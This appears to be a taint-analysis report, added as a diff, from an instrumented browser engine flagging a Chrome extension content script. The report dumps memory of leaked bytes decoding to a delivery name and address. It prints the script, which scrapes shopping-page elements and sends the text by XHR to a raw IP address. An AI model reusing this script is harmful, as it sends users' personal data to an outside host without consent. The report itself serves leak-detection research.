@@ -1,0 +1,134 @@
+>>> TAINT SINK `XHR` REACHED (xml-send-body-ArrayBuffer) <<<
+STACK TRACE START: 
+0x0e07fbfc74f1 <String[74]: c"chrome-extension://nghblfoekbjpebbhdegldnaehkeifpob/content-script.js:17:5">
+STACK TRACE END.
+
+///////////////////////// Details /////////////////////////
+
+** XHR leak, request URL = http://45.79.219.209/
+
+** Tainted bytes: (nullptr=1): 
+
+** Sink object: 0x0e07fbfc6dc9 <ArrayBuffer map = 0x1774c89f6439>
+
+** Propagation paths: 
+
+0xe07fbfc6dc9: [JSArrayBuffer]
+ - map: 0x1774c89f6439 <Map[80](HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x1774c89f65c9 <Object map = 0x1774c89f6481>
+ - elements: 0x31ddea881321 <FixedArray[0]> [HOLEY_ELEMENTS]
+ - hash: 5194
+ - embedder fields: 2
+ - backing_store: 0x22d0032100c0
+ - byte_length: 31
+ - max_byte_length: 31
+ - detachable
+ - properties: 
+ - All own properties (excluding elements): {}
+ - embedder fields = {
+    25205, aligned pointer: 0x6275fb358628
+    1339, aligned pointer: 0x53b00224ea8
+ }
+:
+  0x10ff8a6078e9: [String] in OldSpace: ue"Deliver to Amy\x0aAtlanta 30322\u200c"
+, in function 31166721205009 ``: 0, 503
+  0xe07fbfc7101: [JSTypedArray]
+ - map: 0x1774c89fbeb1 <Map[96](UINT8ELEMENTS)> [FastProperties]
+ - prototype: 0x1774c89fbfc1 <Object map = 0x1774c89fbef9>
+ - elements: 0x31ddea883381 <ByteArray[0]> [UINT8ELEMENTS]
+ - hash: 1144187
+ - embedder fields: 2
+ - buffer: 0x0e07fbfc6dc9 <ArrayBuffer map = 0x1774c89f6439>
+ - byte_offset: 0
+ - byte_length: 31
+ - length: 31
+ - data_ptr: 0x22d0032100c0
+   - base_pointer: (nil)
+   - external_pointer: 0x22d0032100c0
+ - properties: 
+ - All own properties (excluding elements): {}
+ - elements: 0x31ddea883381 <ByteArray[0]> {
+           0: 68
+           1: 101
+           2: 108
+           3: 105
+           4: 118
+           5: 101
+           6: 114
+           7: 32
+           8: 116
+           9: 111
+          10: 32
+          11: 65
+          12: 109
+          13: 121
+          14: 10
+          15: 65
+          16: 116
+          17: 108
+          18: 97
+          19: 110
+          20: 116
+          21: 97
+          22: 32
+          23: 51
+          24: 48
+          25: 51
+       26-27: 50
+          28: 226
+          29: 128
+          30: 140
+ }
+ - embedder fields = {
+    25205, aligned pointer: 0x6275fb358930
+    1339, aligned pointer: 0x53b001e4918
+ }
+, in function 31166721205009 ``: 0, 496
+
+0x10ff8a6078e9: [String] in OldSpace: ue"Deliver to Amy\x0aAtlanta 30322\u200c"
+:
+
+
+** Taint source objects:
+
+
+** Propagation path functions: 
+
+0x1c589158a311 <JSFunction (sfi = 0x1c5891589839)> ``: 0
+console.log("start content-script mv2");
+let tainted_str = document.getElementsByClassName("a-box-inner a-padding-none")[1]
+    .innerText;
+
+let taint_post = document.getElementById("glow-ingress-block").innerText;
+var port = chrome.runtime.connect({name: "knock"});
+
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://45.79.219.209", true);
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4) {
+
+    }
+}
+encoder = new TextEncoder();
+console.log(taint_post);
+xhr.send(encoder.encode(taint_post).buffer);
+
+
+port.postMessage({tstr: tainted_str + "_end"});
+console.log("taint_str="+tainted_str);
+console.log("taint_url="+document.location.href);
+
+
+port.onMessage.addListener(function(msg) {
+    console.log("back str"+msg.backstr);
+    chrome.storage.local.set({ key: msg.backstr }, function(){
+    console.log("key is set to: " + msg.backstr);
+    });
+});
+
+
+
+** Taint source functions: 
+
+
+>>> END TAINT SINK REPORT <<<
